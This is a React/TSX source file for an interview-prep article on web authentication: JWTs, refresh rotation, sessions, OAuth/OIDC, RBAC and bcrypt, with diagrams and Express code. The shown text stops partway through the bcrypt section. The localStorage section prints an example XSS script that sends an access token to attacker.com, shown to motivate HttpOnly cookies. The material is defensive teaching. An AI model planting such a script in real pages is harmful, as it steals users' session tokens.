import MermaidDiagram from "@/components/diagrams/MermaidDiagram";
import { ArticleTable } from "@/components/ui";
import type { TocItem } from "@/lib/types/academy";

const jwtFlowDiagram = String.raw`sequenceDiagram
    actor U as User
    participant S as Server
    participant DB as Database

    U->>S: POST /auth/login { email, password }
    S->>DB: SELECT user WHERE email = ?
    DB-->>S: { id, email, passwordHash, role }
    S->>S: bcrypt.compare(password, hash)
    S->>S: jwt.sign({ sub: userId, role }, secret, { expiresIn: "15m" })
    S-->>U: 200 { accessToken } + Set-Cookie: refreshToken (HttpOnly)

    Note over U,S: Later — authenticated request
    U->>S: GET /api/me\nAuthorization: Bearer <accessToken>
    S->>S: jwt.verify(token, secret)
    S->>S: Extract sub, role from payload
    S-->>U: 200 { user data }`;

const refreshFlowDiagram = String.raw`sequenceDiagram
    actor U as User
    participant S as Server
    participant DB as Database

    U->>S: GET /api/data\nAuthorization: Bearer expiredToken
    S->>S: jwt.verify() → TokenExpiredError
    S-->>U: 401 { code: "TOKEN_EXPIRED" }

    U->>S: POST /auth/refresh\nCookie: refreshToken=xyz (HttpOnly, auto-sent)
    S->>DB: SELECT WHERE tokenHash = hash(xyz) AND revoked=false
    DB-->>S: { userId, role, expiresAt }
    S->>S: check expiresAt > now
    S->>DB: UPDATE SET revoked=true (rotate: invalidate old)
    S->>DB: INSERT new refresh token record
    S->>S: jwt.sign({ sub: userId, role }, { expiresIn: "15m" })
    S-->>U: 200 { accessToken } + Set-Cookie: new refreshToken

    U->>S: GET /api/data\nAuthorization: Bearer newAccessToken
    S-->>U: 200 { data }`;

const sessionFlowDiagram = String.raw`sequenceDiagram
    actor U as User
    participant S as Server
    participant R as Redis (Session Store)

    U->>S: POST /auth/login { email, password }
    S->>S: verify credentials
    S->>R: SET session:abc123 { userId, role } EX 86400
    S-->>U: 200 + Set-Cookie: sessionId=abc123; HttpOnly; Secure

    Note over U,S: Later — authenticated request
    U->>S: GET /api/me\nCookie: sessionId=abc123 (auto-sent)
    S->>R: GET session:abc123
    R-->>S: { userId, role }
    S-->>U: 200 { user data }

    Note over U,S: Logout — instant revocation
    U->>S: POST /auth/logout
    S->>R: DEL session:abc123
    S-->>U: 204 (session gone immediately)`;

const oauthDiagram = String.raw`sequenceDiagram
    actor U as User
    participant A as Your App
    participant G as Google (Auth Server)
    participant R as Google Resource Server

    U->>A: Click "Login with Google"
    A->>U: Redirect to Google with client_id, scope, redirect_uri
    U->>G: Login + Consent screen
    G-->>U: Redirect to /callback?code=AUTH_CODE
    U->>A: GET /callback?code=AUTH_CODE
    A->>G: POST /token { code, client_id, client_secret }
    G-->>A: { access_token, id_token, refresh_token }
    A->>R: GET /userinfo (Bearer access_token)
    R-->>A: { email, name, picture }
    A->>U: Logged in!`;

const rbacDiagram = String.raw`flowchart TD
    USER["User: alice\nrole: admin"]
    ROLE["Role: admin"]
    P1["Permission: users:read"]
    P2["Permission: users:write"]
    P3["Permission: users:delete"]
    P4["Permission: posts:*"]

    USER --> ROLE
    ROLE --> P1 & P2 & P3 & P4

    CHECK["requireRole('admin')\nChecks: req.user.role === 'admin'"]
    USER --> CHECK`;

const passwordResetDiagram = String.raw`sequenceDiagram
    actor U as User
    participant S as Server
    participant DB as Database
    participant E as Email Service

    U->>S: POST /auth/forgot-password { email }
    S->>DB: SELECT user WHERE email = ?
    Note over S: Always respond 200 — don't reveal if email exists
    S->>S: generate crypto.randomBytes(32) → token
    S->>DB: INSERT password_resets { userId, tokenHash, expiresAt: now+1h }
    S->>E: Send email with link: /reset-password?token=RAW_TOKEN
    S-->>U: 200 { message: "If email exists, check your inbox" }

    U->>S: POST /auth/reset-password { token, newPassword }
    S->>S: hash(token) → tokenHash
    S->>DB: SELECT WHERE tokenHash=? AND expiresAt > now AND used=false
    DB-->>S: { userId }
    S->>DB: UPDATE user SET passwordHash = bcrypt(newPassword)
    S->>DB: UPDATE reset SET used=true (one-time use)
    S->>DB: DELETE all sessions for userId (force re-login)
    S-->>U: 200 { message: "Password updated" }`;

export const toc: TocItem[] = [
  { id: "authentication", title: "What is authentication?", level: 2 },
  { id: "authorization", title: "What is authorization?", level: 2 },
  { id: "authn-vs-authz", title: "Authentication vs authorization", level: 2 },
  { id: "how-jwt-works", title: "How does JWT authentication work?", level: 2 },
  { id: "jwt-parts", title: "What are the parts of a JWT?", level: 2 },
  { id: "jwt-storage", title: "Where should JWTs be stored?", level: 2 },
  { id: "localstorage-risks", title: "Risks of storing JWTs in localStorage", level: 2 },
  { id: "access-refresh-tokens", title: "Access tokens vs refresh tokens", level: 2 },
  { id: "refresh-flow", title: "How to refresh an expired access token", level: 2 },
  { id: "revoke-jwt", title: "How do you revoke JWTs?", level: 2 },
  { id: "session-auth", title: "What is session-based authentication?", level: 2 },
  { id: "jwt-vs-sessions", title: "JWT vs sessions: which to choose?", level: 2 },
  { id: "oauth", title: "What is OAuth?", level: 2 },
  { id: "openid-connect", title: "What is OpenID Connect?", level: 2 },
  { id: "rbac", title: "Role-based access control (RBAC)", level: 2 },
  { id: "permission-based", title: "Permission-based access control", level: 2 },
  { id: "protect-routes", title: "How to protect routes in Express", level: 2 },
  { id: "auth-middleware", title: "What should an auth middleware do?", level: 2 },
  { id: "hash-passwords", title: "How do you hash passwords?", level: 2 },
  { id: "no-plaintext", title: "Why never store plain text passwords?", level: 2 },
  { id: "bcrypt", title: "What is bcrypt?", level: 2 },
  { id: "salting", title: "What is salting?", level: 2 },
  { id: "hashing-vs-encryption", title: "Hashing vs encryption", level: 2 },
  { id: "brute-force", title: "Protecting against brute-force login", level: 2 },
  { id: "password-reset", title: "Handling password reset securely", level: 2 },
];

export default function InterviewAuth() {
  return (
    <div className="article-content">
      <p>
        Section 6 of 18 — Authentication and authorization. These are the questions most likely
        to be asked in depth at senior level. Interviewers want to see you know the security
        tradeoffs, not just the implementation.
      </p>

      {/* ─── Q1 ─── */}
      <h2 id="authentication">What is authentication?</h2>
      <p>
        Authentication answers <strong>&quot;who are you?&quot;</strong> — it verifies the
        identity of the person or system making a request. The server checks credentials
        (password, token, certificate) and establishes identity before granting access.
        Authentication always comes before authorization.
      </p>
      <p>
        Examples: logging in with email + password, presenting a JWT, using an API key, OAuth
        with Google, a client certificate in mTLS.
      </p>

      {/* ─── Q2 ─── */}
      <h2 id="authorization">What is authorization?</h2>
      <p>
        Authorization answers <strong>&quot;what are you allowed to do?&quot;</strong> — it
        determines what an already-authenticated identity is permitted to access or perform.
        Authorization always assumes authentication has already succeeded.
      </p>
      <p>
        Examples: checking if a user has the <code>admin</code> role before allowing delete,
        verifying a user owns the resource they are trying to edit, checking if an API key has
        the <code>write:orders</code> scope.
      </p>

      {/* ─── Q3 ─── */}
      <h2 id="authn-vs-authz">What is the difference between authentication and authorization?</h2>
      <ArticleTable caption="The distinction matters — wrong status codes and wrong error messages break clients" minWidth={800}>
        <table>
          <thead>
            <tr>
              <th></th>
              <th>Authentication (AuthN)</th>
              <th>Authorization (AuthZ)</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong>Question</strong></td>
              <td>Who are you?</td>
              <td>What can you do?</td>
            </tr>
            <tr>
              <td><strong>Failure status</strong></td>
              <td>401 Unauthorized</td>
              <td>403 Forbidden</td>
            </tr>
            <tr>
              <td><strong>Client action on failure</strong></td>
              <td>Re-login, refresh token, attach credentials</td>
              <td>Show &quot;Access denied&quot; UI — re-login won&apos;t help</td>
            </tr>
            <tr>
              <td><strong>Checked by</strong></td>
              <td><code>authenticate</code> middleware (JWT verify, session lookup)</td>
              <td><code>authorize</code> middleware (role check, permission check, ownership)</td>
            </tr>
            <tr>
              <td><strong>Order</strong></td>
              <td>Always first</td>
              <td>After authentication succeeds</td>
            </tr>
          </tbody>
        </table>
      </ArticleTable>
      <pre>
        <code>{`// Incorrect: 401 for a permission error
if (user.role !== "admin") res.status(401).json({ error: "Unauthorized" });
// ← Wrong! The client will try to log in again — useless

// Correct: 403 for permission denied
if (user.role !== "admin") res.status(403).json({ error: "Forbidden" });
// ← Client shows "Access denied" — correct behaviour`}</code>
      </pre>

      {/* ─── Q4 ─── */}
      <h2 id="how-jwt-works">How does JWT authentication work?</h2>
      <MermaidDiagram
        chart={jwtFlowDiagram}
        title="JWT Authentication Flow"
        caption="The server signs a token on login. The client sends it in every subsequent request. The server verifies the signature — no DB lookup needed for each request."
        minHeight={480}
      />
      <p>
        The key property: the server is <strong>stateless</strong>. After signing the JWT, it
        does not store it anywhere. Verification only requires the secret/public key — no DB
        query per request. This is what makes JWTs scale horizontally so easily.
      </p>

      {/* ─── Q5 ─── */}
      <h2 id="jwt-parts">What are the parts of a JWT?</h2>
      <p>
        A JWT is three base64url-encoded JSON objects joined by dots:{" "}
        <code>header.payload.signature</code>. All three parts are visible to anyone who holds
        the token — JWTs are signed, not encrypted. Never put secrets in JWT claims.
      </p>
      <pre>
        <code>{`// A JWT looks like:
// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDM5ODA4MDAsImV4cCI6MTcwMzk4MTcwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

// Part 1: Header (base64url decoded)
{
  "alg": "HS256",   // signing algorithm: HS256 (HMAC-SHA256) or RS256 (RSA)
  "typ": "JWT"
}

// Part 2: Payload (base64url decoded) — VISIBLE TO ANYONE
{
  "sub": "user-123",      // subject: user ID (standard claim)
  "role": "admin",        // custom claim
  "iat": 1703980800,      // issued at (Unix timestamp)
  "exp": 1703981700,      // expiry (Unix timestamp — 15 min later)
  "iss": "myapp.com",     // issuer (optional but good practice)
  "jti": "abc-123"        // JWT ID — unique ID for blacklisting
}

// Part 3: Signature — verifies the token wasn't tampered with
// HMACSHA256(base64url(header) + "." + base64url(payload), SECRET)
// If anyone modifies the payload, the signature check fails

// ❌ Never put in payload:
// - Passwords or password hashes
// - Credit card numbers
// - Any data you don't want the client to read`}</code>
      </pre>

      {/* ─── Q6 ─── */}
      <h2 id="jwt-storage">Where should JWTs be stored?</h2>
      <ArticleTable caption="Storage location determines your XSS vs CSRF risk profile" minWidth={820}>
        <table>
          <thead>
            <tr>
              <th>Storage</th>
              <th>XSS risk</th>
              <th>CSRF risk</th>
              <th>Recommendation</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><code>localStorage</code></td>
              <td>🔴 High — JS can read it</td>
              <td>🟢 None — not auto-sent</td>
              <td>❌ Avoid for auth tokens</td>
            </tr>
            <tr>
              <td><code>sessionStorage</code></td>
              <td>🔴 High — JS can read it</td>
              <td>🟢 None</td>
              <td>❌ Avoid — same XSS risk as localStorage</td>
            </tr>
            <tr>
              <td><code>HttpOnly</code> Cookie</td>
              <td>🟢 None — JS cannot read it</td>
              <td>🟡 Possible — need CSRF token</td>
              <td>✅ Best for refresh tokens</td>
            </tr>
            <tr>
              <td>Memory (JS variable)</td>
              <td>🟡 Low — lost on refresh</td>
              <td>🟢 None</td>
              <td>✅ Good for short-lived access tokens</td>
            </tr>
          </tbody>
        </table>
      </ArticleTable>
      <p>
        <strong>Best practice pattern:</strong> access token in memory (JS variable — lost on
        page refresh, which is fine), refresh token in an <code>HttpOnly; Secure; SameSite=Strict</code>{" "}
        cookie. The refresh endpoint issues a new access token silently when the page loads or
        the access token expires.
      </p>

      {/* ─── Q7 ─── */}
      <h2 id="localstorage-risks">What are the risks of storing JWTs in localStorage?</h2>
      <p>
        Any JavaScript running on your page can read <code>localStorage</code> — including
        third-party scripts, ads, analytics libraries, and XSS payloads. If an attacker
        injects any script into your page (via a dependency, a comment field, a vulnerable
        library), they can steal every token in localStorage and use them from their server
        with no expiry.
      </p>
      <pre>
        <code>{`// An XSS attack stealing localStorage tokens:
// Attacker injects this script via a comment field, URL parameter, or compromised CDN:
<script>
  fetch("https://attacker.com/steal?token=" + localStorage.getItem("accessToken"));
</script>
// Token is now on the attacker's server — they can make API calls as the victim

// With HttpOnly cookies — this attack is impossible:
// localStorage.getItem("accessToken") → null (nothing there)
// document.cookie → cannot read HttpOnly cookies
// The token travels automatically with every same-origin request
// JavaScript simply cannot access it

// HttpOnly cookie setup on the server:
res.cookie("refreshToken", token, {
  httpOnly: true,   // JS cannot read
  secure: true,     // HTTPS only
  sameSite: "strict", // not sent on cross-site requests (CSRF protection)
  maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
  path: "/auth",    // only sent to /auth/* routes
});`}</code>
      </pre>

      {/* ─── Q8 ─── */}
      <h2 id="access-refresh-tokens">What is the difference between access tokens and refresh tokens?</h2>
      <ArticleTable caption="Short-lived access tokens + long-lived refresh tokens = security without constant re-login" minWidth={820}>
        <table>
          <thead>
            <tr>
              <th></th>
              <th>Access Token</th>
              <th>Refresh Token</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong>Purpose</strong></td>
              <td>Proves identity on each API request</td>
              <td>Gets a new access token when the old one expires</td>
            </tr>
            <tr>
              <td><strong>Lifetime</strong></td>
              <td>Short: 5–15 minutes</td>
              <td>Long: 7–30 days</td>
            </tr>
            <tr>
              <td><strong>Stored where</strong></td>
              <td>Memory (JS variable)</td>
              <td>HttpOnly cookie</td>
            </tr>
            <tr>
              <td><strong>Sent where</strong></td>
              <td><code>Authorization: Bearer &lt;token&gt;</code> header</td>
              <td>Only to <code>/auth/refresh</code> endpoint (via cookie)</td>
            </tr>
            <tr>
              <td><strong>Revocable?</strong></td>
              <td>Not easily — valid until it expires</td>
              <td>Yes — stored in DB, can be invalidated instantly</td>
            </tr>
            <tr>
              <td><strong>If stolen?</strong></td>
              <td>Attacker has access for 5–15 minutes max</td>
              <td>Attacker can get new access tokens until refresh expires or revoked</td>
            </tr>
          </tbody>
        </table>
      </ArticleTable>

      {/* ─── Q9 ─── */}
      <h2 id="refresh-flow">How do you refresh an expired access token?</h2>
      <MermaidDiagram
        chart={refreshFlowDiagram}
        title="Token Refresh Flow with Rotation"
        caption="The client detects 401 TOKEN_EXPIRED, silently calls /auth/refresh with the HttpOnly cookie, gets a new access token, and retries the original request. Refresh token rotation invalidates the old token on each use."
        minHeight={560}
      />
      <pre>
        <code>{`// Server: /auth/refresh endpoint
app.post("/auth/refresh", asyncHandler(async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  if (!refreshToken) throw new UnauthorizedError("No refresh token");

  // Hash the cookie value and look it up (never store raw tokens)
  const tokenHash = crypto.createHash("sha256").update(refreshToken).digest("hex");
  const stored = await db.refreshToken.findFirst({
    where: { tokenHash, revoked: false, expiresAt: { gt: new Date() } },
    include: { user: true },
  });
  if (!stored) throw new UnauthorizedError("Invalid or expired refresh token");

  // Rotate: invalidate old token, issue new one
  const newRawToken = crypto.randomBytes(40).toString("hex");
  await db.$transaction([
    db.refreshToken.update({ where: { id: stored.id }, data: { revoked: true } }),
    db.refreshToken.create({
      data: {
        userId: stored.userId,
        tokenHash: crypto.createHash("sha256").update(newRawToken).digest("hex"),
        expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
      },
    }),
  ]);

  // Issue new access token
  const accessToken = jwt.sign(
    { sub: stored.userId, role: stored.user.role },
    config.jwtSecret,
    { expiresIn: "15m" }
  );

  res.cookie("refreshToken", newRawToken, { httpOnly: true, secure: true, sameSite: "strict" });
  res.json({ accessToken });
}));`}</code>
      </pre>

      {/* ─── Q10 ─── */}
      <h2 id="revoke-jwt">How do you revoke JWTs?</h2>
      <p>
        Short-lived access JWTs cannot be truly revoked — they are valid until they expire.
        This is the main tradeoff of stateless auth. The solutions:
      </p>
      <pre>
        <code>{`// Strategy 1: Short expiry (simplest — most common)
// Access tokens expire in 15 min — even if stolen, limited damage window
jwt.sign(payload, secret, { expiresIn: "15m" });

// Strategy 2: Token blacklist in Redis (for critical revocation)
// On logout or account suspension, add the JWT ID (jti) to a blacklist
app.post("/auth/logout", authenticate, asyncHandler(async (req, res) => {
  const { jti, exp } = req.jwtPayload!;
  const ttl = exp - Math.floor(Date.now() / 1000); // seconds until expiry
  if (ttl > 0) {
    await redis.setex(\`blacklist:jti:\${jti}\`, ttl, "1");
  }
  // Also revoke refresh token
  res.clearCookie("refreshToken");
  res.sendStatus(204);
}));

// authenticate middleware checks the blacklist:
const blacklisted = await redis.get(\`blacklist:jti:\${payload.jti}\`);
if (blacklisted) throw new UnauthorizedError("Token has been revoked");

// Strategy 3: Token version in DB (heavier but complete control)
// Each user has a tokenVersion field. JWT includes version.
// On logout/password change: increment tokenVersion in DB
// authenticate checks JWT version matches DB — if not, reject
// Downside: DB lookup on every request (kills stateless benefit)

// Strategy 4: Refresh token revocation (most practical)
// Can't revoke access tokens, but CAN revoke refresh tokens instantly
// Access expires in 15 min anyway — acceptable window for most apps`}</code>
      </pre>

      {/* ─── Q11 ─── */}
      <h2 id="session-auth">What is session-based authentication?</h2>
      <MermaidDiagram
        chart={sessionFlowDiagram}
        title="Session-Based Authentication Flow"
        caption="The server stores session data (userId, role) and gives the client an opaque session ID in a cookie. Every request the cookie is sent automatically, server looks up the session."
        minHeight={480}
      />
      <pre>
        <code>{`import session from "express-session";
import RedisStore from "connect-redis";
import { redis } from "./lib/redis";

app.use(session({
  store: new RedisStore({ client: redis }),
  secret: config.sessionSecret,   // signs the session ID cookie
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: true,        // HTTPS only
    sameSite: "strict",  // CSRF protection
    maxAge: 24 * 60 * 60 * 1000, // 24h
  },
}));

// Login: create session
app.post("/auth/login", asyncHandler(async (req, res) => {
  const user = await verifyCredentials(req.body.email, req.body.password);
  req.session.userId = user.id;
  req.session.role = user.role;
  res.json({ message: "Logged in" });
}));

// Authenticate middleware: read from session
function authenticate(req, res, next) {
  if (!req.session.userId) throw new UnauthorizedError();
  req.user = { id: req.session.userId, role: req.session.role };
  next();
}

// Logout: instant revocation
app.post("/auth/logout", (req, res) => {
  req.session.destroy();
  res.clearCookie("connect.sid");
  res.sendStatus(204);
});`}</code>
      </pre>

      {/* ─── Q12 ─── */}
      <h2 id="jwt-vs-sessions">JWT vs sessions: which one would you choose and why?</h2>
      <ArticleTable caption="Neither is universally better — the right choice depends on your architecture" minWidth={840}>
        <table>
          <thead>
            <tr>
              <th></th>
              <th>JWT (stateless)</th>
              <th>Sessions (stateful)</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong>State</strong></td>
              <td>None on server — self-contained token</td>
              <td>Server stores session data (Redis)</td>
            </tr>
            <tr>
              <td><strong>Scalability</strong></td>
              <td>Excellent — any server verifies with just the secret</td>
              <td>Needs shared session store (Redis) across instances</td>
            </tr>
            <tr>
              <td><strong>Revocation</strong></td>
              <td>Hard — tokens valid until expiry (workaround: blacklist)</td>
              <td>Instant — delete session from Redis</td>
            </tr>
            <tr>
              <td><strong>Payload size</strong></td>
              <td>Larger — data travels in every request header</td>
              <td>Small — just an opaque session ID in cookie</td>
            </tr>
            <tr>
              <td><strong>Microservices</strong></td>
              <td>Great — services verify JWT independently, no central auth call</td>
              <td>Harder — all services need access to session store</td>
            </tr>
            <tr>
              <td><strong>Best for</strong></td>
              <td>Microservices, APIs consumed by mobile/SPA, public APIs</td>
              <td>Traditional web apps, when instant revocation is required</td>
            </tr>
          </tbody>
        </table>
      </ArticleTable>
      <p>
        <strong>Interview answer:</strong> &quot;I&apos;d choose JWT for APIs consumed by
        SPAs or mobile apps because of horizontal scalability and statelessness. I&apos;d use
        sessions for server-rendered web apps that need instant logout — for example, banking
        or admin panels where compromised accounts must be locked out immediately.&quot;
      </p>

      {/* ─── Q13 ─── */}
      <h2 id="oauth">What is OAuth?</h2>
      <p>
        OAuth 2.0 is an <strong>authorization framework</strong> — it lets a user grant a
        third-party application limited access to their account on another service, without
        sharing their password. It is about <em>delegated access</em>, not authentication.
      </p>
      <MermaidDiagram
        chart={oauthDiagram}
        title="OAuth 2.0 Authorization Code Flow"
        caption="Your app never sees the user's Google password. Google issues a code, your server exchanges it for tokens, then uses the access token to read the user's profile."
        minHeight={520}
      />
      <pre>
        <code>{`// Key OAuth 2.0 concepts:
// - Resource Owner: the user
// - Client: your application
// - Authorization Server: Google, GitHub, Auth0 — issues tokens
// - Resource Server: the API that holds the user's data
// - Scope: what your app is asking permission for (email, profile, read:repos)

// The authorization code is short-lived and one-time use
// Your server exchanges it for tokens using client_secret (never sent to browser)
// This keeps your client_secret safe — only server-to-server exchange

// Common OAuth flows:
// Authorization Code: server-side web apps and SPAs (most secure)
// PKCE (Proof Key for Code Exchange): SPAs and mobile — no client_secret needed
// Client Credentials: machine-to-machine (no user involved)
// Implicit: deprecated — was for SPAs, replaced by PKCE`}</code>
      </pre>

      {/* ─── Q14 ─── */}
      <h2 id="openid-connect">What is OpenID Connect?</h2>
      <p>
        OpenID Connect (OIDC) is a thin identity layer <strong>on top of OAuth 2.0</strong>.
        OAuth 2.0 only handles authorization (access to resources). OIDC adds authentication
        — it defines how to verify a user&apos;s identity and get their profile information
        (email, name, picture) via a standardized <code>id_token</code> (a JWT).
      </p>
      <pre>
        <code>{`// OAuth 2.0 alone: gives you an access token to call an API
// → "you can read this user's calendar" — but WHO is the user? OAuth doesn't say.

// OpenID Connect adds: id_token (a JWT with user identity)
// → "here's WHO the user is: { sub: 'google-123', email: 'alice@gmail.com', name: 'Alice' }"

// OIDC flow is identical to OAuth Authorization Code flow, plus:
// 1. Add "openid" to scope: scope=openid email profile
// 2. Token response includes id_token (JWT) alongside access_token
// 3. Verify id_token signature against provider's JWKS endpoint
// 4. Extract user identity from id_token claims

// The id_token from Google:
{
  "iss": "https://accounts.google.com",
  "sub": "1234567890",            // stable user ID — use as your user's external ID
  "email": "alice@gmail.com",
  "name": "Alice Smith",
  "picture": "https://...",
  "aud": "YOUR_CLIENT_ID",        // verify this matches your app
  "exp": 1703981700,
  "iat": 1703980800
}

// Real-world: libraries like passport.js or Auth0's SDK handle all of this
// Understand the concepts so you can debug and explain the flow`}</code>
      </pre>

      {/* ─── Q15 ─── */}
      <h2 id="rbac">How would you implement role-based access control (RBAC)?</h2>
      <MermaidDiagram
        chart={rbacDiagram}
        title="Role-Based Access Control"
        caption="Users have roles. Roles have permissions. Middleware checks the role on req.user before the route handler runs."
        minHeight={360}
      />
      <pre>
        <code>{`// Roles stored in JWT or session — set at login
// jwt.sign({ sub: userId, role: "admin" }, secret)

// requireRole middleware factory
function requireRole(...allowedRoles: string[]) {
  return (req: Request, res: Response, next: NextFunction) => {
    if (!req.user) throw new UnauthorizedError();
    if (!allowedRoles.includes(req.user.role)) throw new ForbiddenError();
    next();
  };
}

// Usage — compose with authenticate
router.delete("/users/:id",
  authenticate,              // verify identity
  requireRole("admin"),      // check role
  deleteUser                 // handler (only reached if both pass)
);

router.get("/reports",
  authenticate,
  requireRole("admin", "manager"), // multiple roles allowed
  getReports
);

// Hierarchy: if roles have levels, use a numeric level check
const ROLE_LEVELS = { viewer: 1, editor: 2, manager: 3, admin: 4 };
function requireLevel(minLevel: number) {
  return (req, res, next) => {
    const userLevel = ROLE_LEVELS[req.user!.role] ?? 0;
    if (userLevel < minLevel) throw new ForbiddenError();
    next();
  };
}`}</code>
      </pre>

      {/* ─── Q16 ─── */}
      <h2 id="permission-based">How would you implement permission-based access control?</h2>
      <p>
        Permission-based (also called Attribute-Based, ABAC) is more granular than RBAC.
        Instead of checking a role, you check specific permissions like <code>users:delete</code>{" "}
        or <code>orders:write</code>. A user can have many permissions regardless of role.
      </p>
      <pre>
        <code>{`// Permissions stored as an array in JWT or loaded from DB
// jwt.sign({ sub: userId, permissions: ["users:read", "orders:write"] }, secret)

// requirePermission middleware factory
function requirePermission(permission: string) {
  return (req: Request, res: Response, next: NextFunction) => {
    if (!req.user) throw new UnauthorizedError();
    if (!req.user.permissions?.includes(permission)) throw new ForbiddenError();
    next();
  };
}

// Usage
router.delete("/users/:id",
  authenticate,
  requirePermission("users:delete"),
  deleteUser
);

// Resource ownership check — even finer grained
// "users can only edit their own profile, admins can edit any"
async function requireOwnershipOrAdmin(req, res, next) {
  const resource = await db.user.findUnique({ where: { id: req.params.id } });
  if (!resource) throw new NotFoundError("User");
  if (req.user!.id !== resource.id && req.user!.role !== "admin") {
    throw new ForbiddenError("You can only edit your own profile");
  }
  next();
}

// DB-backed permissions (loads fresh on each request — more accurate, more expensive)
async function authenticate(req, res, next) {
  const payload = jwt.verify(token, secret);
  const user = await db.user.findUnique({
    where: { id: payload.sub },
    include: { permissions: true },
  });
  req.user = { ...user, permissions: user.permissions.map(p => p.name) };
  next();
}`}</code>
      </pre>

      {/* ─── Q17 ─── */}
      <h2 id="protect-routes">How do you protect routes in Express?</h2>
      <pre>
        <code>{`// Layer 1: Global authentication — protect all /api routes
app.use("/api", authenticate); // all routes under /api require auth

// Layer 2: Router-level — protect a group of routes
const adminRouter = express.Router();
adminRouter.use(authenticate, requireRole("admin")); // all admin routes
adminRouter.get("/users", listAllUsers);
adminRouter.delete("/users/:id", deleteUser);
app.use("/admin", adminRouter);

// Layer 3: Route-level — protect individual routes
app.get("/public/health", healthCheck);                    // public
app.get("/api/profile", authenticate, getProfile);          // auth required
app.delete("/api/posts/:id", authenticate, requireRole("admin"), deletePost); // admin only

// Layer 4: Handler-level — ownership check inside the handler
app.patch("/api/posts/:id", authenticate, asyncHandler(async (req, res) => {
  const post = await db.post.findUnique({ where: { id: req.params.id } });
  if (!post) throw new NotFoundError("Post");
  if (post.authorId !== req.user!.id && req.user!.role !== "admin") {
    throw new ForbiddenError();
  }
  const updated = await db.post.update({ where: { id: post.id }, data: req.body });
  res.json({ data: updated });
}));

// Public routes come BEFORE authentication middleware:
app.get("/health", healthCheck);              // public
app.post("/auth/login", login);              // public
app.post("/auth/refresh", refresh);          // public
app.use("/api", authenticate);               // everything below requires auth
app.use("/api/users", usersRouter);
app.use("/api/orders", ordersRouter);`}</code>
      </pre>

      {/* ─── Q18 ─── */}
      <h2 id="auth-middleware">What should an auth middleware do?</h2>
      <pre>
        <code>{`// A complete authenticate middleware:
async function authenticate(req: Request, res: Response, next: NextFunction) {
  try {
    // 1. Extract the token
    const authHeader = req.headers.authorization;
    if (!authHeader?.startsWith("Bearer ")) throw new UnauthorizedError("No token");
    const token = authHeader.slice(7);

    // 2. Verify signature and expiry
    const payload = jwt.verify(token, config.jwtPublicKey) as JwtPayload;

    // 3. (Optional) Check blacklist for logout/revocation
    if (payload.jti) {
      const revoked = await redis.get(\`blacklist:jti:\${payload.jti}\`);
      if (revoked) throw new UnauthorizedError("Token has been revoked");
    }

    // 4. (Optional) Load fresh user from DB — for role changes to take effect
    // Tradeoff: one DB query per request. Skip if you can tolerate stale role data.
    // const user = await userRepo.findById(payload.sub);
    // if (!user || user.suspended) throw new UnauthorizedError();

    // 5. Attach user identity to req — available to all subsequent middleware
    req.user = {
      id: payload.sub as string,
      role: payload.role as string,
      permissions: payload.permissions as string[] ?? [],
    };

    next();
  } catch (err) {
    if (err instanceof jwt.TokenExpiredError) {
      next(new UnauthorizedError("Token expired")); // client should refresh
    } else if (err instanceof jwt.JsonWebTokenError) {
      next(new UnauthorizedError("Invalid token"));
    } else {
      next(err);
    }
  }
}`}</code>
      </pre>

      {/* ─── Q19 ─── */}
      <h2 id="hash-passwords">How do you hash passwords?</h2>
      <pre>
        <code>{`import bcrypt from "bcrypt";

// Hashing (at registration or password change)
const SALT_ROUNDS = 12; // cost factor — higher = slower = harder to brute-force
const passwordHash = await bcrypt.hash(plaintextPassword, SALT_ROUNDS);
// Store passwordHash in DB — NOT the original password

// Verifying (at login)
const isValid = await bcrypt.compare(plaintextPassword, storedHash);
if (!isValid) throw new UnauthorizedError("Invalid credentials");

// Complete login flow:
app.post("/auth/login", asyncHandler(async (req, res) => {
  const { email, password } = LoginSchema.parse(req.body);

  const user = await db.user.findUnique({ where: { email } });

  // Always compare even if user doesn't exist — prevents timing attacks
  // that reveal whether an email is registered
  const dummyHash = "$2b$12$..."; // pre-computed dummy hash
  const hashToCompare = user?.passwordHash ?? dummyHash;
  const isValid = await bcrypt.compare(password, hashToCompare);

  if (!user || !isValid) {
    throw new UnauthorizedError("Invalid email or password"); // same message always!
  }

  // Issue tokens...
}));`}</code>
      </pre>

      {/* ─── Q20 ─── */}
      <h2 id="no-plaintext">Why should you never store plain text passwords?</h2>
      <p>
        If your database is compromised — via SQL injection, a misconfigured backup, a malicious
        employee, or a breach — plain text passwords give the attacker immediate access to every
        account, plus access to other services where users reused the same password. Hashed
        passwords require the attacker to crack each one individually, which is computationally
        expensive with proper algorithms.
      </p>
      <p>
        In addition: regulations (GDPR, SOC 2, PCI-DSS) require passwords to be stored using
        strong one-way cryptographic hashing. Storing plain text is a compliance violation and
        an immediate audit finding.
      </p>

      {/* ─── Q21 ─── */}
      <h2 id="bcrypt">What is bcrypt?</h2>
      <p>
        bcrypt is a password hashing algorithm designed in 1999 specifically for hashing
        passwords. Its key properties:
      </p>
      <ul>
        <li>
          <strong>Adaptive cost factor:</strong> a <code>rounds</code> parameter controls how
          slow the hash is. As hardware gets faster, you increase rounds. Target: 100–300ms per
          hash.
        </li>
        <li>
          <strong>Built-in salt:</strong> generates a unique random salt per hash automatically.
          Two identical passwords produce completely different hashes.
        </li>
        <li>
          <strong>One-way:</strong> you cannot decrypt a bcrypt hash. Verification requires
          recomputing the hash with the same salt.
        </li>
        <li>
          <strong>Maximum 72 bytes:</strong> bcrypt silently truncates passwords longer than 72
          bytes. If supporting very long passwords, pre-hash with SHA-256 first.
        </li>
      </ul>
      <pre>
        <code>{`// Bcrypt cost: each round doubles the work
// rounds=10: ~100ms  — fine for low-traffic apps
// rounds=12: ~400ms  — recommended balance (Google's recommendation)
// rounds=14: ~1.6s   — high security, painful UX at scale

// Choose based on: acceptable login latency vs brute-force resistance
